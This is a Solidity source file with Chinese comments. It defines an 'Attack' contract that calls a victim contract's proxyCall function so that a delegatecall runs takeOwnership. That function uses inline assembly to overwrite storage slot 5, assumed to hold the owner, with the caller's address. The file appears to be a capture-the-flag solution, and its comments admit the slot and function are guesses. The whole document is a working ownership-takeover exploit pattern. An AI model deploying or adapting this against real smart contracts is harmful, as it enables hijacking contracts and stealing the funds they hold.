// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
}

contract Attack {
    address internal immutable victim;

    constructor(address _victim) payable {
        victim = _victim;
    }

    // 该函数试图通过调用victim合约的proxyCall来改变owner
    function exploit() external {
        // 此处调用一个会通过delegatecall修改owner的函数，具体实现取决于victim合约的逻辑
        // 假设是通过某个可以被代理调用的函数，如takeOwnership
        bytes memory data = abi.encodeWithSelector(this.takeOwnership.selector);
        (bool success, ) = victim.call(abi.encodeWithSignature("proxyCall(bytes)", data));
        require(success, "Delegatecall failed");
    }

    // 试图被delegatecall调用以修改owner的函数
    function takeOwnership() external {
        // 通过内联汇编直接修改存储，这里需要根据实际存储位置调整
        assembly {
            // 假设owner存储位置，这里以位置5为例
            sstore(5, caller())
        }
    }
}
